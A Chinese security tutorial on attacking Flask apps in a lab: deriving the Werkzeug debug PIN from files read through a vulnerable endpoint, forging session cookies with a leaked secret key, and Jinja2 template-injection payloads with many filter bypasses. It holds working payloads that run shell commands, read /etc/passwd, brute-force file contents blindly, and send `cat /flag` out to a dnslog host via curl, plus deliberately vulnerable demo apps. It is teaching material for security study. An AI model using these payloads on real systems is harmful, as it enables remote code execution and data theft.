本文首发于“合天智汇”公众号 作者：HhhM

# flask安全

最近跑了培训写了点flask的session伪造，没能用上，刚好整理了一下先前的资料把flask三种考过的点拿出来写写文章。

# debug pin

本地先起一个开启debug模式的服务：

    
    
    # -*- coding: utf-8 -*-    from flask import Flask
    app = Flask(__name__)
    
    @app.route("/")
    def hello():
        return 'hello world!'
    
    if __name__ == "__main__":
        app.run(host="0.0.0.0", port=8080, debug=True)

本机启动时会打印出如下：

    
    
    Use a production WSGI server instead.
     * Debug mode: on
     * Restarting with windowsapi reloader
     * Debugger is active!
     * Debugger PIN: 284-467-555
     * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)

多次启动会发现打印的PIN码是相同的，分析源自参考链接，可以得出debug pin由六个值决定：

  * 用户
  * flask.app
  * Flask
  * flask目录下的一个app.py的绝对路径
  * 当前电脑的MAC地址，为mac地址的十进制表达式
  * 首先尝试读取/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值，若有就直接返回；假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\\Microsoft\\\Cryptography的值，并返回

也就是我们如果能够伪造这六个值我们就能够生成一个一模一样的PIN码了。

# 靶机测试

而要获取这六个值我们可以通过任意文件读取来获得，因此本地写一个文件读取的漏洞点，并且为了方便写一个报错页面，放docker上启动：

    
    
    # -*- coding: utf-8 -*-    from flask import Flask, request
    app = Flask(__name__)
    
    @app.route("/")
    def hello():
        return Hello['a']
    
    @app.route("/file")
    def file():
        filename = request.args.get('filename')
        try:
            with open(filename, 'r') as f:
                return f.read()
        except:
            return 'error'
    
    if __name__ == "__main__":
        app.run(host="0.0.0.0", port=8080, debug=True)

  * flask.app
  * Flask
  * 获取machine-id

直接访问即可：

    
    
    http://172.19.75.19:30000/file?filename=/etc/machine-id
    32e48d371198e8420c53b0a1fa37e94d

  * 获取mac地址

    
    
    http://172.19.75.19:30000/file?filename=/sys/class/net/eth0/address
    02:42:ac:11:00:02
    print(0x0242ac110002)
    2485377892354

  * 用户名从报错界面可以获得

使用脚本即可获得pin码：

    
    
    import hashlib
    from itertools import chain
    probably_public_bits = [
        'root',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.5/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
    
    private_bits = [
        '2485377892354',# str(uuid.getnode()),  /sys/class/net/ens33/address
        '32e48d371198e8420c53b0a1fa37e94d'# get_machine_id(), /etc/machine-id
    ]
    
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    
    cookie_name = '__wzd' + h.hexdigest()[:20]
    
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    
    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    
    print(rv)

得到：

    
    
    284-995-758

在debug页面输入后成功执行代码。

# session伪造

p神文中提到一个客户端session，flask中的session是存放在cookie中的，那么cookie中的字段在客户端访问时是可以被修改的，这就是客户端session，像php的session是存放在服务器中的，django的session可以存放在数据库中，也可以以文件形式存放在服务器中。

而flask的客户端session需要解决的就是防篡改问题，p神总结出来为以下四点：

>   1. json.dumps 将对象转换成json字符串，作为数据
  2. 如果数据压缩后长度更短，则用zlib库进行压缩
  3. 将数据用base64编码
  4. 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割

因此，防篡改的功能位于第四步，也就是签名，在前面学过jwt感觉是差不多的，签名不对的话服务端是无法通过验证的。

写一个flask应用后给session赋值（非正式写法）：

    
    
    from flask import session
    session['user'] = 'tom'

可以看到cookie中是有这么一段东西：

    
    
    session=eyJ1c2VyIjoidG9tIn0.XzVf_w.Is2SqC_MS8NIBynok5BQpmldBLI

解密后我们看到：![](https://image.3001.net/images/20200821/1597998405.png!small)

前半截是一个json串，后半截就是一个签名了，倘若有一个ssti，我们通过如{{config}}读取到密钥，那么就可以通过flask-session脚本来伪造session，替换上cookie之后即可达成session伪造。

# 靶机测试

通过ssti获取到密钥：

    
    
    http://127.0.0.1:8080/?a={{config}}

抓包获取session，解密取得格式。

    
    
    {"user":"tom"}

工具伪造session：

    
    
    $ python3 flask_session_cookie_manager3.py encode -s 'hello world' -t '{"user":"admin"}'
    
    eyJ1c2VyIjoiYWRtaW4ifQ.Xzqkag.jq8cULYNeQYVZiH-2Fe3cAfECk4

替换后：![](https://image.3001.net/images/20200821/1597998420.png!small)

# ssti

老生常谈的问题，一直没总结，稍微写写。

先前对于ssti的理解不是很清晰，只会解一些稍简单的ssti，前段时间想出个flask的ssti才发现原来并不是模板中的变量可控就会导致模板注入，一个典型的模板注入如下：

    
    
    from flask import Flask, render_template_string, request
    
    app = Flask(__name__)
    
    
    @app.route('/', methods=['GET', 'POST'])
    @app.route('/index', methods=['GET', 'POST'])
    def index():
        template = '''
            <div>
                <h3>%s</h3>
            </div>
        ''' % (request.url)
    
        return render_template_string(template)

此种形式存在着变量可控的，同时使用了一个不固定的模板，此时就造成了一个ssti，应该认识到的是实际场景很少有ssti的漏洞，因为像这样写模板如果代码量少的话确实方便，但代码量多的话都会写成下面的形式了：

    
    
    def index():
       return render_template("index.html",title='Home',user=request.args.get("user"))<html>
      <head>
        <title>{{title}}</title>
      </head>
     <body>
          <h1>Hello, {{user.name}}!</h1>
      </body>
    </html>

这种情况下是模板先渲染后我们再传入变量，此时代码是安全的；那么目前主题是ssti，当然要继续以不安全的代码来测试一下ssti
:），为方便测试我们对第一套代码再作修改：

    
    
    from flask import Flask, render_template_string, request
    
    app = Flask(__name__)
    app.secret_key = "hello world"
    
    @app.route('/', methods=['GET', 'POST'])
    @app.route('/index', methods=['GET', 'POST'])
    def test():
        template = '''
            <div>
                <h3>%s</h3>
            </div>
        ''' % (request.args.get("a"))
    
        return render_template_string(template)
    
    
    if __name__ == '__main__':
        app.debug = True
        app.run()

运行，传入路由：

    
    
    http://127.0.0.1:5000/?a={{7*7}}

发现输出49，此时就说明了能够被利用来进行ssti的测试；那么前面学习session伪造时所需要的密钥就可以通过config读到：

    
    
    http://127.0.0.1:5000/?a={{config}}

那么此处无论是采用%s、format或是其他形式的格式化字符串都好，只要我们的模板在被渲染之前就存在着某处可控，那么就存在着ssti的风险。

# 无过滤

以前稍微学过，再做个复习。

默认的，所有类追溯回去都能是有着一个object类，因为两个py版本下会有差别，所以分两个py版本进行测试。

# py3.7

第一步先通过一个对象获取到对应的类。

    
    
    #-*- coding:utf-8 -*-    #__author__: HhhM
    
    class MyownClass():
        def __init__(self):
            self.name = "a"
    
    
    print(MyownClass().__class__)
    print("".__class__)
    print([].__class__)
    
    
    """
    out:
    <class '__main__.MyownClass'>
    <class 'str'>
    <class 'list'>
    """

可以看出来__class__是返回该对象所对应的类，下一步拿到基类，也就是object:

    
    
    print(MyownClass().__class__.__base__)
    print("".__class__.__base__)
    print([].__class__.__base__)
    
    """
    out:
    <class 'object'>
    <class 'object'>
    <class 'object'>
    """

那么这里也能得到__base__的作用，获得其是获得类所继承的类，可以看到构造出来是一样的类（object），那么我们写一个继承类看看__base__输出什么：

    
    
    #-*- coding:utf-8 -*-    #__author__: HhhM
    
    
    class MyownClass():
        def __init__(self):
            self.name = "a"
    
    class MyownClass1(MyownClass):
        def __init__(self):
            self.name = "a"
    
    print(MyownClass1().__class__.__base__)
    print(MyownClass1().__class__.__base__.__base__)
    
    """
    out:
    <class '__main__.MyownClass'>
    <class 'object'>
    """

所以我们拿到一个继承类时可以通过base来层层回溯获取到object类，获取到object类后继续：

    
    
    print("".__class__.__base__.__subclasses__())
    print("".__class__.__bases__[0].__subclasses__())
    """
    out:
    [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>,....]
    """

__subclasses__获取的是当前类的子类列表，那么我们对应上面有继承关系的MyownClass这个类获取到的则是：

    
    
    [<class '__main__.MyownClass1'>]

通过object类获取到的是一个列表，因此可以通过列表取值的方式获取到我们需要的类，然而会发现类太多了，找到了我们要的类也不知道他处于列表的哪个位置，可以简单写个脚本跑一下：

    
    
    #-*- coding:utf-8 -*-    #__author__: HhhM
    import json
    
    
    a = """
    <class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>
    """
    
    num = 0
    allList = []
    
    result = ""
    for i in a:
        if i == ">":
            result += i
            allList.append(result)
            result = ""
        elif i == "\n" or i == ",":
            continue
        else:
            result += i
    
    
    for k,v in enumerate(allList):
        if "os" in v:
            print(str(k)+"--->"+v)

我在128取到了<class 'os._wrap_close'>，我们通过调用它的__init__方法进行初始化类：

    
    
    print("".__class__.__base__.__subclasses__()[128].__init__)
    
    """
    <function _wrap_close.__init__ at 0x016E9A50>
    """

通过调用globals可以获取到类内存在的方法、属性等值：

    
    
    print("".__class__.__base__.__subclasses__()[128].__init__.__globals__)

会发现是一个字典，因此我们只需要找到其内存在我们需要的值对应的键之后取值即可。

python3中没有file对象，但还有open，因此有：

    
    
    print("".__class__.__base__.__subclasses__()[128].__init__.__globals__["open"])
    
    """
    <built-in function open>
    """

此时取到的open我在本地测试时会报错，网上提示是被os的open模块覆盖了，测试后可以如下取到：

    
    
    print("".__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']["open"]("2.py").read())

可以看出来各个环境下具体情况也会有区别，本地测试通远程不通大多是这个原因了吧，倒是个需要记住的点。

还有个popen可以执行命令：

    
    
    print("".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']("dir").read())

本地测试的话可以写个脚本跑跑有什么可以用的，像找能够构造出eval的类：

    
    
    for i in "".__class__.__base__.__subclasses__():
        try:
            i.__init__.__globals__['__builtins__']["eval"]("__import__('os').popen('dir').read()")
            print(i)
        except Exception:
            pass

会发现的是只要拥有__builtins__的就可以构造出来。

os模块也能如此利用：

    
    
    "".__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('whoami').read()

# py2.7

py3了解之后再回看py2会明了的多，首先是字符串取基类，我发现就是以py3的payload取：

    
    
    print("".__class__.__base__)
    print(().__class__.__base__)
    """
    out:
    <type 'basestring'>
    <type 'object'>
    """

str类需要再套一层base才能取到object类，而其他内置类不需要。

然后找链的过程就大同小异了，py2区别py3的说就有一个file类，可以直接用来读写文件了，用上面的脚本跑出file对象对应的位置。

    
    
    # 读
    print(().__class__.__base__.__subclasses__()[40]('2.py').readline())
    print(().__class__.__base__.__subclasses__()[40]('2.py').readlines())
    # 写
    print(().__class__.__base__.__subclasses__()[40]('2.py').write('context'))

# bypass

下面环境皆以py3.7作为测试环境，起个docker，发现os._wrap_close处在第35的位置。

# 过滤base

过滤base之后还可以用mro：

    
    
    class MyownClass():
        def __init__(self):
            self.name = "a"
    
    class MyownClass1(MyownClass):
        def __init__(self):
            self.name = "a"
    
    print("".__class__.__mro__)
    print(().__class__.__mro__)
    print(MyownClass1().__class__.__mro__)
    
    """
    out:
    (<class 'str'>, <class 'object'>)
    (<class 'tuple'>, <class 'object'>)
    (<class '__main__.MyownClass1'>, <class '__main__.MyownClass'>, <class 'object'>)
    """

包含了整条的继承链，可以看到的是object一直处于最末，直接取-1即可：

    
    
    print(().__class__.__mro__[-1])

取到object类后接下来的操作就一毛一样了。

也可以用拼接：

    
    
    print(().__class__['__ba'+'se__'])

# 过滤class

拼接：

    
    
    {{()['__cla'+'ss__'].__mro__[-1]}}

这四个都是flask的内置对象，通过他们我们就可以获取到object类了，拼接绕过的话是可以绕过大部分过滤的了。

如果这里mro被过滤了则可以尝试用base一层一层溯源到object类

# 过滤中括号

利用__getitem__可以取第n位，如：

    
    
    http://127.0.0.1:5000/?a={{().__class__.__mro__.__getitem__(-1)}}

也可以用pop弹出列表第n位：

    
    
    {{().__class__.__base__.__subclasses__().pop(-1)}}

# 过滤双大括号

可以考虑使用判断语句：

    
    
    http://127.0.0.1:5000/?a={% if "".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']("curl `cat /flag`.z2yw9j.dnslog.cn").read()=='test' %}1{% endif %}

无回显可用curl外带。

# 过滤subclasses

依旧拼接大法：

    
    
    {{"".__class__.__base__['__subcl'+'asses__']()}}

感觉吧，只要没过滤加号就能拼接绕过。

# 过滤关键字符

前面的话是构造获取需要的方法链时的一个绕过，这里的话就是在命令执行时的绕过，主要是chr函数起的作用，像php或者是nodejs也有类似的玩法，chr()字符拼接达成绕过。

主要是从含有builtins的类中获取到chr函数，如下：

    
    
    "".__class__.__base__.__subclasses__()[35].__init__.__globals__['__builtins__']['chr']

模板语言还是不弱的，我们可以用来设置值简化payload长度同时进行绕过：

    
    
    {% set c = "".__class__.__base__.__subclasses__()[35].__init__.__globals__.__builtins__['chr'] %}{{"".__class__.__base__.__subclasses__()[35].__init__.__globals__['popen'](c(119)%2bc(104)%2bc(111)%2bc(97)%2bc(109)%2bc(105)).read()}}

# 过滤引号

过滤引号的话同样可以用chr来绕过传参时所需要的引号，只需要将先前的链中取值方式略作修改即可，取chr

    
    
    {{().__class__.__base__.__subclasses__()[35].__init__.__globals__.__builtins__.chr}}

则执行命令为：

    
    
    {% set c = ().__class__.__base__.__subclasses__()[35].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[35].__init__.__globals__.popen(c(119)%2bc(104)%2bc(111)%2bc(97)%2bc(109)%2bc(105)).read()}}

因为flask中存在着request这个内置对象，所以我们也可以利用request来绕过。

在使用模板时，当存在{{request.args.test}}，在我们传入?test=asd时即可指定其值为asd，并且默认的为字符串类型，我们可以借此来达成绕过引号。

如：

    
    
    ?a={{().__class__.__base__.__subclasses__()[35].__init__.__globals__.popen(request.args.cmd).read()}}&cmd=ls

事实上如果request对象没被过滤的话，我们可以用此种方式绕过绝大部分过滤。

# 盲注

这个方法是从p0师傅的博客中看到的，就是利用if语句返回值来判断语句是否为真，然后从输出值来判断结果。

py2的话可以用file对象，py3则可以用open。

    
    
    #-*- coding:utf-8 -*-    #__author__: HhhM
    import requests
    
    url = 'http://172.23.129.221:12339/?a='
    
    def check(payload):
        r = requests.get(url+payload).content
        return 'hhhm' in r
    
    password  = ''
    s = """
    0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$'()*+,-./:;<=>?@[\]^`{|}~"_%
    """
    
    for i in range(0,100):
        for c in s:
            payload = '{% if ().__class__.__base__.__subclasses__()[35].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}hhhm{% endif %}'
            if check(payload):
                password += c
                break
        print password

# 过滤init

还有一个替代的__enter__，同样的有paylod：

    
    
    {{().__class__.__base__.__subclasses__()[35].__enter__.__globals__.__builtins__.open("/etc/passwd").read()}}

甚至还有另一个__exit__同样可以替代：

    
    
    {{().__class__.__base__.__subclasses__()[35].__exit__.__globals__.__builtins__.open("/etc/passwd").read()}}

# base64绕过

简单易懂，py2下可以不过py3因为其字符为unicode编码，需要进行转码。

    
    
    {{().__class__.__base__.__subclasses__()[35].__exit__.__globals__.__builtins__.open("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64')).read()}}

# 环境

配套docker已发布于github：https://github.com/a756379684/flask-sec-docker

# 参考

参考自：

<https://xz.aliyun.com/t/2553>

<https://www.leavesongs.com/PENETRATION/client-session-security.html>

<https://xz.aliyun.com/t/7746>

<https://p0sec.net/index.php/archives/120>

## 相关实验

Flask服务端模板注入漏洞

<https://sourl.cn/dyS7CC>

（通过该实验了解服务端模板注入漏洞的危害与利用。）

